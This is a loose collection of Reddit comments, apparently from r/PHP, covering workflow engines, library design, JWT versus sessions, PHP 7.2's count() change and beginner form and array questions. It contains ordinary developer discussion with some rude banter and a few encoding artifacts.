I have done it, But after 1 year I was suprised that I had to pay for another year (in which I didn't gain any wisdom from "them") I use scrum on a daily base. I like scrum but stopped paying after 2 years. It's the experience you gain, that counts the most, not if you're listed (because that doesn't say sh*t about what you can do with it)
I know the meaning of literally, and the that its misusage gets more and mon common in english. I was refering to the meme knowyourmeme.com/memes/literally-unplayable
That's the only thing I can think of.
Please state behaviors/responsibilities you want this one workflow library to have. Also do you know what worflow engine is? Do you need such a solution, or are you really interested in just some nice lib?
Will it support composition properly? How will it handle passing data between steps? How will it integrate with other business systems? **How will it schedule work?** **Monitoring, logging, alarming?** **How will business requirement analyst be able to give requirements?**
Just find people who do scrum and talk with them. 
+1 for Stripe. Altough when you want to support user&lt;-&gt;user payments, you'll need to setup Stripe Connect which means possibly managing the users accounts on their behalf.
If you developed on Windows, and its a linux based host, then it may be filename capitalisation is not consistent through the application. I end up glaring at my team for that more often than anything else :)
I developed on linux. I am having a live chat now with the online hosting company.
The profile picture cringes the fuck out of me. No loop? 
You're welcome. And don't worry about it - most native English speakers have not made the slightest effort in another tongue, so we're not in a position to chuck rocks `:-)` 
*Are italics better to mark more important requirements?*
This is crazy and I love it
It sounds like you might get happy with BPMN. There might even be a PHP implementation, but I would not recommend that.
Link is broken. [This](https://secure.php.net/ChangeLog-7.php#7.2.3) one works.
Interesting. How it's broken for you? What kind of error?
No specific errors, it just times out. Firefox throws up the *Unable to connect* page.
I've *begun* writing it myself based on my current needs. That code that I wrote wasn't so much pseudocode as code because it does run on the library I've written. I think I'm going to look at similar projects and what they provide. I'll need mechanisms for triggering workflows via events, probably some decorators to drop in logging, serialization of workflows, etc.
Workflower is a BPMN implementation. I glanced at the spec and saw convoluted XML and ran away.
BPMN is a graphical notation, similar to UML. There is a XML representation for that as well which is very handy for a BPMN engine to process, but you as a developer would use a modelling tool and be completely agnostic of XML, if you are so scared of it.
Oh I thought you were looking for existing solutions.
How about using a vendor namespace instead of a global function?
https://en.wikipedia.org/wiki/List_of_BPMN_2.0_engines Lists also Omni Workflow as implemented in PHP.
I think there are libraries for the Symfony workflow that can spit out diagrams of the flows. That could be very valuable when analysing what is actually happening in the system. So, your flows are code driven and not data driven, which is fine. Just wondering whether you did consider going the data-driven way? That would be an approach that could allow workflows to be added through admin screens and customised by users. Just curious.
My thinking is that there is no reason that it cannot be both. Code for now, data-driven later (use BMNP or whatever to generate the structure).
You can use it like that, as below. &lt;?php use DivineOmega\PasswordExposed\PasswordExposedChecker; $status = (new PasswordExposedChecker())-&gt;passwordExposed('hunter2'); if ($status == PasswordStatus::EXPOSED) { // Password exposed! } The `password_exposed` helper method is just to make it very simple to use. I wouldn't anticipate any global conflicts with that function name.
A function wrapping the functionality to be easier to use is perfectly fine, but why not simply making the function also namespaced? Doesn't make it any harder to use. `if (!function_exists('...'))` is a huge anti-pattern. It should error out instead, because it will likely mean that something won't work correctly in some location then.
Yes, sounds a great approach. The MVP first, to learn what you can and gain more insight. I have been looking for a workflow engine over the last few months for a Laravel project, and not quite found something that fits my needs. At the moment I have bunches of custom observers, jobs, and a collection of queues. It's fairly simple, but still feels very ad-hoc. There is no *one place of truth* I can go to in the code to see an overview the business processes. This project is about 90% back-end, moving files around, importing data, making and receiving bank payments, and so on, with statuses to be aggregated, groups of users to be notified, errors to be reported. It's all quite fun, but I feel a central workflow engine is what it lacks.
This one also is listed: https://github.com/phpmentors-jp/workflower 
[Here is where this post ought to be](http://www.reddit.com/r/phphelp)
There are absolutely parts that can be abstracted out that are very common in workflows. "Send Notification to Group X" or "Store file to location Y". So if my [workflow generates invoices](https://www.reddit.com/r/PHP/comments/81bgh6/business_workflow_libraries/dv26kob/) I have several steps that need to happen sequentially. * First, orders need retrieved from the model. That step is useful across my software. Not everyone's software, but my software. So I have a Workflow Step that I implement for my application. The step omits a list of Order records. * Second, I need to create the invoice records. Again proprietary to my software. Accepts a list of Order records as input. Omits a list of generated Invoices as output. * Third, I need to run a bunch of processes for each invoice, so next I add what I am calling a "SplitWorkflow" that runs any of the following steps for each Item in the list it received as input. * Next I need to put each Invoice into Quickbooks. So the step accepts an invoice and generates QBXML. It emits the same invoice. This step is very generic, and easily replaced for different accounting packages. * Next I need to generate a summary sheet (Excel file). This is proprietary but based on very common functionality. Take a structure, convert it to some format, emit a file. * Next the file gets stored to cloud storage somewhere. Very generic, easily re-used, emits a URL. * Next I need to email that URL to a customer. Very generic, easily re-used, emits a URL. In some ways, I get what you are saying, but in others, I think there is plenty to be abstracted out and value to be added by having a proper method to put it all together, execute, and track results.
Why is #75981 (https://bugs.php.net/bug.php?id=75981) listed in the 7.0.28 and 7.1.15 changelog, but not in 7.2.3? The reporter actually reproduced the bug in a PHP 7.2.2 build.
Herp, it is there. They just changed the title to "Prevent reading beyond buffer start in http wrapper". nvm.
Please report such posts. 3 reports auto-spams a post for mod review.
Wouldn't it be better to return true or false and to throw an exception when the API couldn't be reached?
Just playing with the demo for that. Looks good.
&gt; It's quite a common practice though, even by huge PHP project such as Laravel common practice != best practice More info: https://www.reddit.com/r/PHP/comments/4fulme/dont_use_illuminate_support_for_your_framework/ There's nothing bad in providing a simple function to simplify usage, but it should be namespaced if it comes in a library, mostly because of name collisions. Alternatively you could also provide just a static method instead of a function. It is still simple to use, but it also benefits from class autoloading. 
Well, my point with my comment above is that I'm a "one-man shop" where everything I pay for comes from my bottom line. I work with other teams that I have to manage. So being the "boss" and a "Scrum master" isn't a contradiction, here.
Thanks for the info. I'll consider doing this, or perhaps just a static function, for the next breaking release.
That's a fair point regarding common practices not necessarily being the best. I shall definitely consider making a simple static method when I make the next breaking release. Thanks very much for the feedback.
That's the reason why Laravel is considered to have a poor coding standard, and to encourage people to write badly architectured code. Wordpress is the other big project that does that, and their codebase is much worse, but due to legacy and backwards-compatibility reasons. So don't let those projects guide you :)
I know WordPress' code base is no where near modern PHP coding standards, but I was under the impression Laravel was actually considered to be pretty top notch as far as coding standards go. What is it about Laravel that encourages devs to write badly architectured code?
It can be used to write utilities that work with code, modifying them and write back(require pretty printer) and for example, AST based diff tool or semantic merge tool or to write a transpiler to another language. When I complete Static Single Assignment with Control Flow Graph, it would be able to write static analyzers in Golang that does not require PHP to be installed. I am planning to use it to build and visualize source based UML and Callgraph. It can be used anywhere where you need work with PHP semantic.
www.php.net has been hit or miss (mostly miss) for me for a very long time. Going to php.net or secure.php.net instead works 100% of the time.
This project may be interesting to you: https://github.com/ircmaxell/Tuli. IIRC from a conversation with Anthony it doesn't support generators or try/catch/throw but is mostly complete aside from that.
Never realized he had an accent. I guess you‚Äôd love mine too than hahaha
'Demand is high, so pay is good' - I have certainly noticed this in recent years (Manchester, UK). At the junior end PHP jobs seem less well paid than other languages, but towards the senior end the gap seems to have closed a lot. There still seems to be a gap in the daily rate charged by PHP contractors compared to other languages though (250-300 per day for PHP whereas closer to 350-450 for other languages, outside of London).
Haha everyone has an accent. 
Thanks!
Here is Troy Hunt (autor of haveibeenpwned) blog entry, about this service: https://www.troyhunt.com/ive-just-launched-pwned-passwords-version-2/ Do recommend reading it, especcialy "Each Password Now Has a Count Next to It" paragraph. It's about reusing passwords from leaked databases.
I recently started and parsing to AST is the first step. Tuli built on top of `ircmaxell/php-cfg` that uses `nikic/PHP-parser`. Eventually, I want to implement the same functionality, it allows writing static code analysis tools in Golang. I have not started optimizing yet, but parser would be faster in Golang, it could be critical in big projects where can be (with vendors) more than 10k files. Also, my parser has own lexer and does not require PHP to be installed, it would be advantageous for CI tools.
True.. I saw that Reddit post yesterday :p
I gotcha - just curious - what do you see in Scrum/Agile that you think would help your company? What I mean is - some see these newer methodologies and think they're the best way to manage and deliver on projects, when for some types of projects Scrum is not the best fit and you're better off going with a waterfall type of approach. I obviously can't speak to what's best for you, but it may be a good idea to looking at the types of projects you're working on, and then seeing what structure works best for those projects. Just my $.02 :)
You've hit a design flaw in Carbon. Creating a new object type for operating with dates was a mistake. Extending Carbon is repeating that mistake. DateTimeInterface is the de-facto standard for date-time value object in PHP. All of those helper methods can be implemented as static methods that take and return DateTimeInterface, instead of creating a fragile hierarchy, and when I say fragile you see literally what that means now (the problem is called "Fragile Base Class"). If you want to standardize on Carbon, that's OK, because as you said, Laravel uses it or whatever. But don't extend it. Write your helpers as static methods returning and taking Carbon objects. If that doesn't work for your case, let us know why did you (or whoever wrote Jenseggers/Date/Date) override this Carbon method.
Yea I‚Äôm tied to Carbon with Laravel. I think this library extending Carbon without locking itself to 1.22.* was the big issue here. If they are going to extend it (good idea or not) they need to specify a version.
That's a fair point. I'm sure it's very lucrative! I was really just talking about full-time employees of these companies. When good programmers refuse to work in such environments, it requires companies to hire people like you to clean up the mess, which is still the end goal!
I simply meant that it might be helpful to look at existing work when porting. I didn't mean to imply your project was not valuable.
I would say no as this breaks backward comparability for minor releases, then again you could be Taylor Orwell and not give a fuck
Laravel is fine. There's just too many people taking the piss or abusing or some Laravel shortcuts to do shit. If there's however one thing I really don't like in Laravel are those functions registered in the global namespace.
no lambda functions as in AWS lambda functions which are basically server-less microservices that run Java, JS or Python code without needing to spin up an actual VM, they only spin up when called and consequently are much cheaper
i think what you are looking for is a "business process automation" system or a "business process orchestration" system. these are complex software and usually only available as java. they basically orchestrate and manage microservice interaction. the good news is you can usually write the microservices in any language . i have never actually found a PHP one that was really enterprise level. a workflow engine usually refers to basically a state machine that simply allows for clear definition of an object's state transitions and events to fire when those transitions occur (eg symfony workflow component)
People: - [CodeCourse/PHPAcademy](https://www.youtube.com/channel/UCpOIUW62tnJTtpWFABxWZ8g) (also check his [website](https://codecourse.com)) - [CodeReviewVideos (mainly symfony)](https://www.youtube.com/channel/UCjeQU2wtPiQjwBNs4W6KwKA) (also check out his [website](https://www.codereviewvideos.com/)) - [Prooph (event sourcing in PHP)](https://www.youtube.com/channel/UCQySdeLu1vIF1SnPrHZ-xRA) - [JREAM](https://www.youtube.com/user/JREAMdesign) (a bit old, but still good) Conference talks: - [PHPNW](https://www.youtube.com/user/phpnwconference) - [PHPUK](https://www.youtube.com/user/phpukconference) - [PHP Barcelona](https://www.youtube.com/channel/UCTRJkDjGNX3kId6RhxgIOmw) - [Nomad PHP ](https://www.youtube.com/channel/UCYHDBrzJ5o5d97KlCAUhICA) 
Alex is the main reason I know shit.
I always treat services and systems like this as a method of farming potential passwords rather than actually just telling you whether you're likely to be affected.
&gt; There is no one place of truth I can go to in the code to see an overview the business processes. I don't think this can be solved in code for any reasonably interesting business process. What I have found useful is to generate a graph of how components interact by drawing a diagram of event generators and event listeners. This code creates the event listener + generators used for a particular task: https://github.com/Danack/SiteTool/blob/master/src/SiteTool/Command/Crawler.php#L27-L41 Inside each of them, they bind to the event manager telling it which events they listen to, or want to create: https://github.com/Danack/SiteTool/blob/master/src/SiteTool/Processor/CheckResponseIsOk.php#L22-L29 Inside that, there is a call to register those in a graph builder: https://github.com/Danack/SiteTool/blob/master/src/SiteTool/GraphVizBuilder.php Which outputs an image like: https://github.com/Danack/SiteTool/blob/master/docs/example_graph_output.png That allows you to present a diagram of wtf is going on in an application to non-programmer people, who are really the ones who should be involved in discussing business use-cases.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [Danack/SiteTool/.../**Crawler.php#L27-L41** (master ‚Üí 4a40346)](https://github.com/Danack/SiteTool/blob/4a40346fa9817972b1f4ac9cf1e00cb0c46db5d7/src/SiteTool/Command/Crawler.php#L27-L41) * [Danack/SiteTool/.../**GraphVizBuilder.php** (master ‚Üí 4a40346)](https://github.com/Danack/SiteTool/blob/4a40346fa9817972b1f4ac9cf1e00cb0c46db5d7/src/SiteTool/GraphVizBuilder.php) * [Danack/SiteTool/.../**CheckResponseIsOk.php#L22-L29** (master ‚Üí 4a40346)](https://github.com/Danack/SiteTool/blob/4a40346fa9817972b1f4ac9cf1e00cb0c46db5d7/src/SiteTool/Processor/CheckResponseIsOk.php#L22-L29) * [Danack/SiteTool/.../**example_graph_output.png** (master ‚Üí 4a40346)](https://github.com/Danack/SiteTool/blob/4a40346fa9817972b1f4ac9cf1e00cb0c46db5d7/docs/example_graph_output.png) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dv36c80.)
Sorry if my answer was aggressive, I am just trying to explain what and why I do. All my work is inspired by those two amazing libs `nikic/PHP-parser` and `ircmaxell/php-cfg`. I did not found analogs and I decided to write same libs in Golang.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
&gt; I guess I'll have to start with PHP --&gt; Zend --&gt; Magento. Is that correct? Yeah, it is correct and it will be a good learning experience for you. Just remember not to trust the core developers to be competent, trustworthy, and/or sane.
&gt; If not JWT, then what? https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid I'm working on the design and implementation for a replacement called [Paseto](https://github.com/paragonie/paseto) (which, for the ease of pronunciation, should almost rhyme with "falsetto").
/r/phphelp [Relative and absolute paths, in the file system and on the web server](https://phpdelusions.net/articles/paths)
HI I AM MILLENNIAL AND I ONLY LEARN FROM YOUTUBE LOL XDDDDDDD
Use trim and then see if the string length is more than 0. Also I hope you're sanitizing your input.
Look up prepared statements and SQL injection. The code you posted is a major security vulnerability.
There's plenty of options for AuthN/AuthZ out there and you're not going to find a one size fits all solution. More often than not, however, a multi-layered approach is better than a single point. That why 2-factor is highly recommended. It's not perfect but it can definitely help. I'd make a list of the requirements for your environment and try to model out the different kinds of auth you might need to protect each part. This will give you a better idea of your requirements. Something I've found useful as far as authorization in modern PHP applications and frameworks that allow middleware is to use consistent urls formats that can be checked from a middleware. For example `/user/:id/view` and `/user/:id/edit` where the middleware can then determine the ID, making it simpler to check the current user for permissions. Incidentally, it sounds like you might be using the JWT as a sort of session that holds authorization information (permissions?). Remember that JWTs are *not* a replacement for sessions. They're an identifier with a bit more metadata than a simple randomized hash. 
But my precious microseconds!
OMG. You won the most ignorant comment of the week award.
/r/phphelp
actually I do have that idea and actually empty is faster. so keep your award, thanks.
It's no shame to do a mistake once. But insisting on it you are are proclaiming yourself an idiot. var_dump(empty(0)) == strlen(0));
what mistake? please read the official documentation - there is an explanation what a function and what a language construct is.
ah ha! Have you considered looking at an agile/scrum coach? Granted, you may have some of the same issues with vetting competence, but if you can find the right person they may be able to steer you in the right direction. References/LinkedIn/etc may be able to help there. It's definitely tough - to find the right people!
So you want to establish yourself as a local clown. You got it
I have no idea what your problem is, but I hope you somehow sort it out :-) 
Thanks, so should I post this in /r/phphelp?
Yes, it was actually written in the post template, if you didn't notice
Patch versions aren't normally for introducing new features. &gt; Given a version number MAJOR.MINOR.PATCH, increment the: &gt; 1. MAJOR version when you make incompatible API changes, 2. MINOR version when you add functionality in a backwards-compatible manner, and 3. PATCH version when you make backwards-compatible bug fixes. https://semver.org/
If you ran /u/colshrapnel's code, you'd notice that `empty('0')`evaluates as true, while `empty(' ')` evaluates as false. So not only would your suggestion *not* prevent strings consisting solely of spaces, it would also prevent legitimate messages from being accepted.
you don't need empty for variables that you're sure are defined. !$variable does the same job
HTTP Basic over TLS. Easy peasy.
oops, no I didn't. I'm in panic mode right now lol
PHP doesn't follow semver though.
People like that clown are spreading ridiculous rumors which contribute to PHP's notorious reputation. 
There's no one-size fits all model; it depends what you're trying to do. However I would say: Stateful, server-side sessions work very, very, well. They've been around for ages, they're very widely used, library support is great, and the issues have been mostly worked out. Your default plan of attack should be sessions, and only if that won't work for your particular use case (which is quite unlikely) should you move to something else. How you handle the session identifier is a separate question. If your clients are browsers, cookies work great. Otherwise, you can can just stick it in the headers, either via a custom header or via basic auth. Either way, your server gets the session ID from the request, checks Redis, and discovers who the request is from, looks up their permissions, checks it hasn't expired, whatever. Boom, problem solved. &gt; I was actively working on a JWT based solution What advantages did you expect this solution to yield that basic sessions would not?
It's worth pointing out that the API that this package uses is only sent the first 5 characters of the password's SHA1 hash, so it really couldn't farm passwords even if it wanted to. :)
It does if you squint.
And he probably would be more open to accepting the proper method if he wasn't attacked for trying to help.
My number one issue with 7.2 is the need for objects to use the countable interface. This borks a lot of apps in the wild. 
Not a bad idea. It represents the time that PHP received the request, as long as your processes aren't long-running (e.g. just handling a request and returning a response) it should be within ~1 second of "now". And as the other guy said, yeah, it's a global variable, but it's provided by PHP and IMHO no worse to use than if there was a built-in function called `request_time()`. It'll work with less effort so use it, to hell with blind adherence to "best practice" when it makes no sense. You can override it easily for unit tests if you need to.
I think JWT should be considered a very specific solution for a very specific problem of having too much traffic and no good way to distribute session information across your servers. That's literally the only thing it's good for. Barring having 10s of millions of visitors a month, nothing beats the simplicity or security of a traditional cookie-based session ID that gets verified and authorized by the server (i.e. stateful server sessions). If you have an SPA, then the initial page load can include a call to get the user's various permissions from the session, and then you can store that in the application storage as needed.
The point where it's open to downgrade attacks - isn't that trivially fixable by blocking weak algorithms? TLS has the same issue, as far as I remember.
Honestly, I've learned more from Youtube than the entirety of my formal education.
Come on, he didn't try to help. He wanted to show off. Who tried to help it was you, by providing a correct answer for the OP. There was nothing else to add. Then out of a blue sky this guy decided to tell everyone what a smart ass he is who knows nuts and bolts of PHP. His answer is not even close to being a help. It's a disservice. Many PHP noobs are impressed with imaginary speed improvements like that. Whereas in reality such a difference (if any) is absolutely of no importance, and will gain you nothing. As a reault, in a pursue for the fictional "optimization", noobs would waste their time rewriting a 100% correct and fast code, or even break it, like this chap suggested. Trust me, it's a real plaque. There are a lot of such arrogant smartasses spreading nonsense. PHP already suffers from too much superstitions, no need to feed one of them
&gt; isn't that trivially fixable by blocking weak algorithms? Downgrade attacks trivially fixable in the same sense that *invalid curve attacks* are trivially fixable, yet in the real world, very few implementations do that until someone flags it as a vulnerability. Instead of trying to adjust all the knobs and levers into a known-secure configuration, and then hoping no third parties that accept your JWTs allow insecure configurations, it's far better to get a less error-prone cryptographic standard in the hands of developers. The reason JWT is insecure isn't because developers are bad, it's because the JOSE standards had none of the insights from the past couple of decades of real world cryptography.
a workflow engine (or activity net) is not a state machine. They are both a subset of Petri Net concept but different ones. Symfony Workflow component is a state machine. 
And there are hundreds of passwords for each such 5gcharacter suffix already. The API srrvice really have no clue what password you are trying yo check. Thr basic idea is that you send in the prefix and get back a list of all matching hashes. Then you check *locally* if your hash matches any of those.
Just to be clear, if you were passing a non-countable object to count(), your code was already borked. Now PHP tells you so. count() on non-countable objects did not have any sensible behavior (like counting the number of properties or something), it simply always returned 1.
Well yeah it's not a good practice, it just breaks a number of packages and things. Like ninja invoice. I'm not sure who would do something stupid like using count to check existence of an object. isset or empty would be better or using is_a to make sure it's an instance of a specific object class. I've worked on some legacy code though where they did use count all over the place to check if an object exists and I always scratch my head and am like wtf were you thinking lol.
For our 14 years old code base, this turns out to be the biggest issue we ever had with PHP version updates. Yes. That includes the update to 7.0. There is a ton of code that does what amounts to `count(null)`, especially in old Smarty templates (yeah. I know. But we're looking at a 300k lines code base. We have to pick our battles). While I could certainly create a wrapper for count and then update all count instances, it would be a real shame to having to do so, because 90% of the cases are probably fine, but then having to analyze each and every callsite is way too time consuming. I'm a bit at a loss of what we should be doing at this point and I have actually considered running a patched PHP in production that doesn‚Äôt fire the warning while we are getting all count instances investigated. In general, I agree with this change, like with all other cleanups going into php in the recent years, but this one is really hard on older code bases. 
You need to do a provision after you change the homestead.yaml file
Not even just micro-services: a simple setup with a load balancer already requires sticky sessions and a shared session storage, which involves more network I/O and failures (of which I see a lot in my logs - depends on network load and general scale though). &gt; If not JWT, then what? What is the prevailing model or approach you take to building a authentication and authorization into your apps? JWT has the advantage of containing signing and reserved fields in the spec, which means that you don't have to re-invent the wheel. A simple serialized object plus HMAC would also be sufficient if you don't care about portability.
Agreed. Even though I used microservices only as an example, I should have de-emphasized it. It can be said, when you're using a loadbalancer, you're dealing with a distributed system thus making sessions tricky -- which makes almost every application of scale distributed in some way.
 $names = array("name1", "name2", "name3", "name4", "name5"); $randomName = $names[rand(0, count($names)-1)]; echo $randomName;
+1 - this is the answer. :) &lt;?php echo array_rand(["Peter","Paul","Mary","Julia","John"]);
this site is share photos of gameplays!!
`array_rand()` is the best answer, being the built-in function for this purpose, but it returns the *key*, not the value of the random array element. $names = ["Peter", "Paul", "Mary", "Julia", "John"]; $random = $names[array_rand($names)];
[@maksim_ka2's latest tweet](https://i.imgur.com/SkQz2ob.jpg) [@maksim_ka2 on Twitter](https://twitter.com/maksim_ka2) - ^I ^am ^a ^bot ^| ^[feedback](https://www.reddit.com/message/compose/?to=twinkiac)
you prooved that i haven't used it once in 18 years. ;)
Great stuff! Much appreciated.
reddit clone in php
Reddit clone using scalable features such as: - sql injection - xss vulnerabilities - slick design - csrf issues Yeah no thanks. I will not get any credentials near that place and neither should anybody else.
the link just throws me a &gt; This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support what does this has to do with PHP?
Besides what /u/phordijk mentioned you also seem to have gotten your shift key stuck.
CAPS LOCK IS CRUISE CONTROL FOR COOL!
If that is a reddit clone my booger is a gold nugget.
Might be worth melting it down, just in case? 
Ooh, where's the code - can we all have a look-see? `:=)` 
https://camunda.org/ is a java bpmn engine that is quite mature and has a php sdk, many big companies here in germany are using it, it also has a workflow modeler as nobody usualy builds that xml manually.
Did you bother to look at how the service actually works before commenting?
There's an issue open for laravel to move those functions to a namespace. Just because laravel does something, doesn't make it right or okay to replicate.
A static function would make it more difficult to mock for testing purposes. What's wrong with just having a class with a regular method?
the reddit clone php sqlite3
This is... PHP subreddit?
Are you saying you want to use a function (eg. myArray()) in place of an variable assigned as array (eg. $myArray)? If so, just wrap an array definition in a function: function myArray() { return [ 'key' =&gt; 'value', ]; } Wherever you call that function, it will return the array you define.
 function getStates() { return array( "ct" =&gt; "Connecticut", "ma" =&gt; "Massachusetts", "nj" =&gt; "New Jersey", "ny" =&gt; "New York", "ri" =&gt; "Rhode Island", ); } function getDestination() { return array( "easterncaribbean" =&gt; "Eastern Caribbean", "southerncaribbean" =&gt; "Southern Caribbean", "westerncaribbean" =&gt; "Western Caribbean", "bermuda" =&gt; "Bermuda", "bahamas" =&gt; "Bahamas", ); }
is it cool if i show you my whole code? 
Yep
how do I type it on reddit so it looks like readable code lol
I‚Äôve been doing a bunch of Wordpress stuff lately and stumbled upon laracast today. That beginner php course is excellent for understanding php and oop 
It means you abstract your code. I'm guessing you're doing this for a class. I think what your teacher is trying to show you is, it's not always best to just staticly define an array of data in the php file. In the real world you're going to be fetching that data from somewhere like a database or an api. Your teacher probably wants you to learn how to store that data in an external function and then access it from that function. It's to get you used to the idea of keeping your data separate from your presentation code (html). Here is what I would do. 1) Create a file in the same directory called: **02-25-2018_functions.php** You will be storing this code in that file: &lt;?php function getStates() { return array( "ct" =&gt; "Connecticut", "ma" =&gt; "Massachusetts", "nj" =&gt; "New Jersey", "ny" =&gt; "New York", "ri" =&gt; "Rhode Island", ); } function getDestinations() { return array( "easterncaribbean" =&gt; "Eastern Caribbean", "southerncaribbean" =&gt; "Southern Caribbean", "westerncaribbean" =&gt; "Western Caribbean", "bermuda" =&gt; "Bermuda", "bahamas" =&gt; "Bahamas", ); } 2) Use this HTML: https://pastebin.com/feuYV3Gz (the link expires in a day) You will see that all I changed was requiring in the functions file and assigning the data returned from ``getStates()`` and ``getDestinations`` to ``$stateArray`` and ``$destinationArray`` respectively. That's it.
I think you are wanting to output a select menu with the current user-selected value, so your function would be something like: function states_options($selected='') { global $stateArray; foreach ($stateArray as $key =&gt; $value) { $sel = ($selected==$key)?" selected=\"selected\"":""; $result.= "&lt;option value =\"$key\"$sel&gt; $value&lt;/option&gt;"; } return $result; } then insert it like &lt;select id="state" name="state" class="myDropdown"&gt; &lt;option value=""&gt;Please select...&lt;/option&gt; &lt;?php echo states_options($state); ?&gt; &lt;/select&gt;
This may sound dumb, but can you please explain the function that you created? I'm still learning how to embed php into html and it is kind of tough.
Using javascript. Default field to red. Check field contents onChange, and if not empty change to green. If empty change to red.
well im taking a php class, so it would be appreciated if you could explain how to do it in php
If the user doesnt provide required field info, you will only know it when the script is able to run again... which will be when they submit the form. So, if they submit... you will need to check the forms POST or GET values (i.e. $_POST['firstname']) and if it is empty, then you could apply a class or css style to the field that makes it red. 
Well are you sure your ternary if statement is correct? Just use squiggly brackets. 
These are my validation messages. Is there a way I can add background color to this statement? &lt;?php // test if first name field is empty if (empty($firstName)) { echo "&lt;div class=\"validationError\"&gt;&lt;p&gt;*PLEASE PROVIDE A FIRST NAME.&lt;/p&gt;&lt;/div&gt;"; $isFormValid = false; } // test if last name field is empty if (empty($lastName)) { echo "&lt;div class=\"validationError\"&gt;&lt;p&gt;*PLEASE PROVIDE A LAST NAME.&lt;/p&gt;&lt;/div&gt;"; $isFormValid = false; } // test if city field is empty if (empty($city)) { echo "&lt;div class=\"validationError\"&gt;&lt;p&gt;*PLEASE PROVIDE A CITY.&lt;/p&gt;&lt;/div&gt;"; $isFormValid = false; } // test if state field is empty if (empty($state)) { echo "&lt;div class=\"validationError\"&gt;&lt;p&gt;*PLEASE CHOOSE A STATE.&lt;/p&gt;&lt;/div&gt;"; $isFormValid = false; } // test if email list field is empty if (empty($emailList)) { echo "&lt;div class=\"validationError\"&gt;&lt;p&gt;*PLEASE CHOOSE IF YOU WANT TO BE ON OUR E-MAIL LIST.&lt;/p&gt;&lt;/div&gt;"; $isFormValid = false; } // test if checkbox field is empty if (empty($checkBox)) { echo "&lt;div class=\"validationError\"&gt;&lt;p&gt;*PLEASE ACCEPT THE TERMS OF THE CONTEST.&lt;/p&gt;&lt;/div&gt;"; $isFormValid = false; } // message to user if form is valid if ($isFormValid) { echo "&lt;div id=\"thankYou\"&gt;&lt;p&gt;Thank you for filling out the form.&lt;/p&gt;&lt;/div&gt;"; } } ?&gt; 
You could wrap the whole thing in a div with a background color...
You should go read about how forms and GET/POST work. Also use /r/php for learning php questions
I actually meant to send this one. This is the actual text box that you type the information. &lt;label for="firstName"&gt;&lt;span class="redText"&gt; &lt;?php if (!$firstName) echo "*" ?&gt; &lt;/span&gt;First Name:&lt;/label&gt; &lt;input type="text" name="firstName" id="firstName" value="&lt;?php echo $firstName; ?&gt;"&gt; &lt;br&gt;&lt;br&gt; &lt;label for="lastName"&gt;&lt;span class="redText"&gt; &lt;?php if (!$lastName) echo "*" ?&gt; &lt;/span&gt;Last Name:&lt;/label&gt; &lt;input type="text" name="lastName" id="lastName" value="&lt;?php echo $lastName; ?&gt;"&gt; &lt;br&gt;&lt;br&gt; &lt;label&gt;&lt;span class="redText"&gt; &lt;?php if (!$city) echo "*" ?&gt; &lt;/span&gt;City:&lt;/label&gt; &lt;input type="text" name="city" id="city" value="&lt;?php echo $city; ?&gt;"&gt;
i am here to learn...
You could use JS/jquery and on the form submit check the value of each input. So for example for first name you could do $(‚Äú#formIdHere‚Äù).submit(function(){ var firstName = $(‚Äú#idHere‚Äù).val(); if(firstName == ‚Äú‚Äù){ $(‚Äú#idHere‚Äù).css(......); OR $(‚Äú#idHere‚Äù).addClass(.....); return false; } } I like using addClass. I will create a class called error with the styling for an error. Client side validation is great but also make sure to validate values server side as well. 
You could use JS/jquery and on the form submit check the value of each input. So for example for first name you could do $(‚Äú#formIdHere‚Äù).submit(function(){ var firstName = $(‚Äú#idHere‚Äù).val(); if(firstName == ‚Äú‚Äù){ $(‚Äú#idHere‚Äù).css(......); OR $(‚Äú#idHere‚Äù).addClass(.....); return false; } } I like using addClass. I will create a class called error with the styling for an error. Client side validation is great but also make sure to validate values server side as well.
What you're looking for is jQuery, not php. JQuery can do client side (before php is run) form validation. Learn jQuery and apply it to your code.
You can use POST to detect if the form was submitted, then use a series of if else statements to echo HTML that corresponds to what is or isn‚Äôt correct. I‚Äôm on mobile but I can help with the concepts more if you want. 
Does Reddit normally make code look horrible? 
Other people have had suggestions that'll work but they aren't how people should check if a field is set; HTML an attribute to require form inputs. &lt;input type="text" name="firstName" required /&gt; OR &lt;input type="text" name="firstName" required="required" /&gt; That should work but I'm on my phone so I can't check it. Hope that helps. 
Why do you need php to do this? Make your input required and just use CSS... https://developer.mozilla.org/en-US/docs/Learn/HTML/Forms/Form_validation
What if the wrapper just logs failure cases with a backtrace, would that make it easier to track down those 10% of broken cases?
The op is asking a question related to style (css), not markup do's/dont's.
&lt;div class=‚Äú&lt;?php if( ! isset($_POST[‚Äòexample‚Äô])) {echo ‚Äòclassname‚Äô}?&gt;‚Äù &lt;/div &gt;
There seems to be only 2 forks on this repo: https://github.com/xml315xiao/balance/network/members 
Good point. So I guess I'm losing my mind :(
I need it to only display the bg color if the user submits with empty fields
I guess the point is, if the user forgets to fill in the required text field, then the background color should turn a different color to indicate, "hey, you forgot this." I'm just not sure how to code it. I understand logically if the user doesn't fill in the required field then display the textbox to be yellow. If you want to look at my entire code I can paste it to show you.
 It does if you put 4 spaces at the start of each line. ```Otherwise, surrounding it in 3 backticks will make it look more readable.```
I created a library to perform deep clones of objects, without having to learn complicated configuration setups and copy strategies. It just does what it says on the tin: https://packagist.org/packages/zero-config/clone $copy = deepClone($original); * Objects are cloned recursively. * Properties of all visibilities (public, protected, private) are cloned. * Static properties are NOT cloned. * Singletons remain singletons. * Relations are kept in-tact. References to siblings will also be referenced between cloned siblings. * Cloning does not cause recursion errors when object pairs reference each other. There is an UTF-8 character as alias to deepClone, üóê $copy = üóê($original) To use an object oriented approach: use ZeroConfig\Cloner\Cloner; $cloner = new Cloner(); $copy = $cloner($original); Godspeed
Relax.
What sort of trouble? Sounds like fud to me. 
No, that's deprecated. He should be switching to the new way of doing it.
Thanks
